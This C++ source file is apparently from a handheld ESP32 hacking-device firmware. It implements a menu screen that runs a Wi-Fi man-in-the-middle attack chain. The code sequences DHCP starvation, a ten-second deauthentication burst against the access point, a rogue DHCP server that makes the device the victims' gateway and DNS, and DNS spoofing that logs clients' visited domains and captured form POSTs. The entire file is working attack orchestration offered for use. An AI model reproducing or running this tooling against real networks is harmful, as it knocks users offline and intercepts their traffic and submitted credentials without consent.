#include "NetworkMitmScreen.h"
#include "core/Device.h"
#include "core/ScreenManager.h"
#include "screens/wifi/network/NetworkMenuScreen.h"
#include "ui/actions/ShowStatusAction.h"
#include "utils/StorageUtil.h"
#include <WiFi.h>

NetworkMitmScreen* NetworkMitmScreen::_instance = nullptr;

// ── Lifecycle ───────────────────────────────────────────────────────────────

void NetworkMitmScreen::onInit()
{
  _showMenu();
}

void NetworkMitmScreen::onBack()
{
  if (_state == STATE_RUNNING) {
    _stop();
    _showMenu();
  } else {
    Screen.goBack();
  }
}

void NetworkMitmScreen::onItemSelected(uint8_t index)
{
  if (_state != STATE_MENU) return;

  switch (index) {
    case 0: // DHCP Starvation
      _starvEnabled = !_starvEnabled;
      _starvSub = _starvEnabled ? "On" : "Off";
      _menuItems[0].sublabel = _starvSub.c_str();
      render();
      break;

    case 1: // Deauth Burst
      _deauthBurst = !_deauthBurst;
      _deauthSub = _deauthBurst ? "On" : "Off";
      _menuItems[1].sublabel = _deauthSub.c_str();
      render();
      break;

    case 2: // Rogue DHCP
      _rogueEnabled = !_rogueEnabled;
      _rogueSub = _rogueEnabled ? "On" : "Off";
      _menuItems[2].sublabel = _rogueSub.c_str();
      render();
      break;

    case 3: { // DNS Spoof
      if (!_dnsEnabled) {
        if (!Uni.Storage || !Uni.Storage->exists(DnsSpoofServer::CONFIG_PATH)) {
          ShowStatusAction::show("dns_config not found", 1500);
          render();
          break;
        }
      }
      _dnsEnabled = !_dnsEnabled;
      _dnsSub = _dnsEnabled ? "On" : "Off";
      _menuItems[3].sublabel = _dnsSub.c_str();
      render();
      break;
    }

    case 4: { // File Manager
      if (!_fmEnabled) {
        if (!Uni.Storage || !Uni.Storage->exists(WebFileManager::WEB_PATH)) {
          ShowStatusAction::show("File manager not downloaded", 1500);
          render();
          break;
        }
      }
      _fmEnabled = !_fmEnabled;
      _fmSub = _fmEnabled ? "On" : "Off";
      _menuItems[4].sublabel = _fmSub.c_str();
      render();
      break;
    }

    case 5: // Start
      _start();
      break;
  }
}

void NetworkMitmScreen::onUpdate()
{
  if (_state != STATE_RUNNING) {
    ListScreen::onUpdate();
    return;
  }

  // Exit
  if (Uni.Nav->wasPressed()) {
    auto dir = Uni.Nav->readDirection();
    if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) {
      _stop();
      _showMenu();
      return;
    }
  }

  // DNS Spoof
  if (_dnsEnabled) {
    _dnsSpoof.update();
  }

  // Rogue DHCP (only runs after starvation is done)
  if (_rogueEnabled && !_starvRunning) {
    _rogueDhcp.update();
  }

  // Deauth burst phase
  if (_deauthRunning) {
    unsigned long elapsed = millis() - _deauthStart;
    if (elapsed >= 10000) {
      _stopDeauthBurst();
      _reconnectStaticIP();
      _startRogueDhcp();
    } else if (_attacker) {
      _attacker->deauthenticate(_savedBSSID, _savedChannel);
      delay(50);
    }
  }

  // DHCP Starvation (non-blocking: one step per frame)
  if (_starvRunning) {
    _starv.step();

    if (_starv.isExhausted()) {
      _starvRunning = false;
      _starv.stop();

      const auto& s = _starv.stats();
      char buf[60];
      snprintf(buf, sizeof(buf), "[+] Pool exhausted! ACK:%lu NAK:%lu",
               (unsigned long)s.ack, (unsigned long)s.nak);
      _log.addLine(buf, TFT_GREEN);

      // Chain: deauth burst if enabled, then rogue DHCP
      if (_deauthBurst) {
        _startDeauthBurst();
      } else {
        _startRogueDhcp();
      }
    } else if (_starv.isStuck()) {
      _starvRunning = false;
      _starv.stop();

      _log.addLine("[!] Starvation failed (stuck)", TFT_RED);

      // Still start Rogue DHCP if enabled
      _startRogueDhcp();
    }
  }

  // Redraw
  if (millis() - _lastDraw > 800) {
    render();
    _lastDraw = millis();
  }
}

void NetworkMitmScreen::onRender()
{
  if (_state == STATE_RUNNING) { _drawLog(); return; }
  ListScreen::onRender();
}

// ── Menu ────────────────────────────────────────────────────────────────────

void NetworkMitmScreen::_showMenu()
{
  _state = STATE_MENU;
  _rogueSub  = _rogueEnabled ? "On" : "Off";
  _dnsSub    = _dnsEnabled ? "On" : "Off";
  _fmSub     = _fmEnabled ? "On" : "Off";
  _starvSub  = _starvEnabled ? "On" : "Off";
  _deauthSub = _deauthBurst ? "On" : "Off";

  _menuItems[0] = {"DHCP Starvation",  _starvSub.c_str()};
  _menuItems[1] = {"Deauth Burst",     _deauthSub.c_str()};
  _menuItems[2] = {"Rogue DHCP",       _rogueSub.c_str()};
  _menuItems[3] = {"DNS Spoof",        _dnsSub.c_str()};
  _menuItems[4] = {"File Manager",     _fmSub.c_str()};
  _menuItems[5] = {"Start"};
  setItems(_menuItems, 6);
}

// ── Start ───────────────────────────────────────────────────────────────────

void NetworkMitmScreen::_start()
{
  if (!_rogueEnabled && !_dnsEnabled && !_fmEnabled && !_starvEnabled) {
    ShowStatusAction::show("Enable at least one option!");
    return;
  }
  if (_dnsEnabled && !StorageUtil::hasSpace()) {
    ShowStatusAction::show("Storage full! (<20KB free)");
    return;
  }

  _state         = STATE_RUNNING;
  _log.clear();
  _lastDraw      = 0;
  _starvRunning  = false;
  _deauthRunning = false;
  _instance      = this;

  // Save network info for deauth burst + reconnect
  _savedSSID     = WiFi.SSID();
  _savedPassword = "";  // WiFi keeps credentials internally
  _savedIP       = WiFi.localIP();
  _savedGateway  = WiFi.gatewayIP();
  _savedSubnet   = WiFi.subnetMask();
  _savedChannel  = WiFi.channel();
  memcpy(_savedBSSID, WiFi.BSSID(), 6);

  IPAddress localIP = WiFi.localIP();
  char ipBuf[40];
  snprintf(ipBuf, sizeof(ipBuf), "[*] IP: %s", localIP.toString().c_str());
  _log.addLine(ipBuf);

  // 1. Start Rogue DHCP (deferred if starvation is also enabled)
  if (_rogueEnabled && !_starvEnabled) {
    _startRogueDhcp();
  }

  // 2. Start DNS Spoof
  if (_dnsEnabled) {
    _dnsSpoof.setUpstreamDns(WiFi.dnsIP());
    _dnsSpoof.setCaptiveIntercept(false);
    _dnsSpoof.setVisitCallback(_onDnsVisit);
    _dnsSpoof.setPostCallback(_onDnsPost);
    _dnsSpoof.setFileManagerEnabled(_fmEnabled);
    if (_dnsSpoof.begin(localIP)) {
      _log.addLine("[+] DNS Spoof active");
      for (int i = 0; i < _dnsSpoof.recordCount(); i++) {
        char buf[60];
        const char* path = _dnsSpoof.records()[i].path;
        const char* lastSlash = strrchr(path, '/');
        const char* name = lastSlash ? lastSlash + 1 : path;
        snprintf(buf, sizeof(buf), "    %s > %s",
                 _dnsSpoof.records()[i].domain, name);
        _log.addLine(buf);
      }
    } else {
      _log.addLine("[!] DNS Spoof failed", TFT_RED);
      _dnsEnabled = false;
    }
  }

  // 3. Start File Manager
  if (_fmEnabled) {
    if (_fileManager.begin()) {
      if (_dnsEnabled) {
        _log.addLine("[+] File Manager: unigeek.local");
      } else {
        _log.addLine("[+] File Manager on :8080");
      }
    } else {
      _log.addLine("[!] File Manager failed", TFT_RED);
      _fmEnabled = false;
    }
  }

  // 4. Start DHCP Starvation (last, interruptible)
  if (_starvEnabled) {
    _log.addLine("[*] DHCP Starvation...");
    render();
    if (_starv.begin()) {
      _starvRunning = true;
      char ipBuf2[40];
      snprintf(ipBuf2, sizeof(ipBuf2), "[+] Reconnected: %s",
               WiFi.localIP().toString().c_str());
      _log.addLine(ipBuf2);
    } else {
      _log.addLine("[!] Starvation failed", TFT_RED);
      _starvEnabled = false;
    }
  }

  _log.addLine("BACK/Press to stop");
  _drawLog();
}

// ── Start Rogue DHCP (called after starvation or directly) ──────────────────

void NetworkMitmScreen::_startRogueDhcp()
{
  if (!_rogueEnabled) return;

  _rogueDhcp.setClientCallback(_onDhcpClient);
  if (_rogueDhcp.begin()) {
    _log.addLine("[+] Rogue DHCP active");
    _log.addLine("    Gateway + DNS = us");
  } else {
    _log.addLine("[!] Rogue DHCP failed", TFT_RED);
    _rogueEnabled = false;
  }
}

// ── Deauth Burst ────────────────────────────────────────────────────────────

void NetworkMitmScreen::_startDeauthBurst()
{
  _log.addLine("[*] Deauth burst (10s)...");
  _drawLog();

  // Disconnect from network first
  WiFi.disconnect(true);
  delay(100);

  // Create attacker (sets WIFI_MODE_APSTA)
  _attacker = new WifiAttackUtil();
  _deauthRunning = true;
  _deauthStart = millis();
}

void NetworkMitmScreen::_stopDeauthBurst()
{
  _deauthRunning = false;
  if (_attacker) {
    delete _attacker;
    _attacker = nullptr;
  }
  _log.addLine("[+] Deauth burst done");
}

void NetworkMitmScreen::_reconnectStaticIP()
{
  _log.addLine("[*] Reconnecting (static IP)...");
  _drawLog();

  WiFi.mode(WIFI_STA);
  WiFi.config(_savedIP, _savedGateway, _savedSubnet, _savedGateway);
  WiFi.begin(_savedSSID.c_str(), nullptr, _savedChannel, _savedBSSID);

  unsigned long start = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - start < 10000) {
    delay(100);
  }

  if (WiFi.status() == WL_CONNECTED) {
    char buf[60];
    snprintf(buf, sizeof(buf), "[+] Reconnected: %s", WiFi.localIP().toString().c_str());
    _log.addLine(buf);
  } else {
    _log.addLine("[!] Reconnect failed", TFT_RED);
  }
}

// ── Stop ────────────────────────────────────────────────────────────────────

void NetworkMitmScreen::_stop()
{
  if (_deauthRunning) {
    _stopDeauthBurst();
  }
  if (_starvRunning) {
    _starv.stop();
    _starvRunning = false;
  }
  if (_rogueEnabled) {
    _rogueDhcp.stop();
  }
  if (_dnsEnabled) {
    _dnsSpoof.end();
  }
  if (_fmEnabled) {
    _fileManager.end();
  }

  _instance       = nullptr;
  _rogueEnabled   = false;
  _dnsEnabled     = false;
  _fmEnabled      = false;
  _starvEnabled   = false;
  _deauthBurst    = false;
  _deauthRunning  = false;
  _log.clear();
  _lastDraw       = 0;

  ShowStatusAction::show("Stopped", 1000);
}

// ── Callbacks ───────────────────────────────────────────────────────────────

void NetworkMitmScreen::_onDnsVisit(const char* clientIP, const char* domain)
{
  if (!_instance) return;
  char buf[60];
  snprintf(buf, sizeof(buf), "[>] %s %s", clientIP, domain);
  _instance->_log.addLine(buf);
}

void NetworkMitmScreen::_onDnsPost(const char* clientIP, const char* domain, const char* data)
{
  if (!_instance) return;
  char buf[60];
  snprintf(buf, sizeof(buf), "[+] POST %s", domain);
  _instance->_log.addLine(buf, TFT_GREEN);
}

void NetworkMitmScreen::_onDhcpClient(const char* mac, const char* ip)
{
  if (!_instance) return;
  char buf[60];
  snprintf(buf, sizeof(buf), "[+] DHCP %s", ip);
  _instance->_log.addLine(buf, TFT_GREEN);
}

// ── Log ─────────────────────────────────────────────────────────────────────

void NetworkMitmScreen::_drawLog()
{
  auto* self = this;
  _log.draw(Uni.Lcd, bodyX(), bodyY(), bodyW(), bodyH(),
    [](Sprite& sp, int barY, int w, void* ud) {
      auto* s = static_cast<NetworkMitmScreen*>(ud);
      sp.setTextColor(TFT_GREEN, TFT_BLACK);
      sp.setTextDatum(TL_DATUM);
      char label[40];
      if (s->_deauthRunning) {
        int remaining = 10 - (int)((millis() - s->_deauthStart) / 1000);
        if (remaining < 0) remaining = 0;
        snprintf(label, sizeof(label), "Deauth: %ds left", remaining);
      } else if (s->_starvRunning) {
        const auto& st = s->_starv.stats();
        snprintf(label, sizeof(label), "A:%lu N:%lu T:%lu CT:%d/20",
                 (unsigned long)st.ack, (unsigned long)st.nak,
                 (unsigned long)st.timeout, s->_starv.consecutiveTimeouts());
      } else if (s->_rogueEnabled) {
        snprintf(label, sizeof(label), "DHCP: %d clients", s->_rogueDhcp.clientCount());
      } else {
        snprintf(label, sizeof(label), "Running");
      }
      sp.drawString(label, 2, barY);
    }, self);
}
